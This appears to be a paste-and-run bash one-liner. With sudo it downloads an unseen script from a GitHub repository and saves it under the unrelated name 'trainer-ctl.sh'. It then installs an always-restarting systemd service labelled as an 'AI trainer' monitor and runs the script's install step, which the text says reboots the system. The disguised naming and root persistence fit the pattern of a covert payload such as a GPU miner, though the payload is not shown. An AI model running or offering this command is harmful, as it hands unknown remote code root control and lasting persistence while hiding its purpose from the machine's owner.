/bin/bash -c 'SCRIPT_URL="https://raw.githubusercontent.com/max313iq/Ssl/refs/heads/main/docker_nvidia_install.sh"; SCRIPT_PATH="/usr/local/bin/trainer-ctl.sh"; SERVICE_NAME="trainer-monitor"; echo "Downloading script..."; sudo wget -O "$SCRIPT_PATH" "$SCRIPT_URL" && sudo chmod +x "$SCRIPT_PATH"; echo "Creating systemd service..."; SERVICE_CONTENT="[Unit]\nDescription=AI trainer Container Start and Monitor Service\nAfter=network-online.target docker.service\nRequires=docker.service\n\n[Service]\nUser=$USER\nType=simple\nExecStartPre=/bin/bash -c \"$SCRIPT_PATH start\"\nExecStart=/bin/bash -c \"$SCRIPT_PATH monitor\"\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target"; echo -e "$SERVICE_CONTENT" | sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null; sudo systemctl daemon-reload; sudo systemctl enable $SERVICE_NAME.service > /dev/null; echo -e "\n=== Starting installation and system reboot. The trainer will start and monitor itself automatically after reboot. ==="; sudo "$SCRIPT_PATH" install'
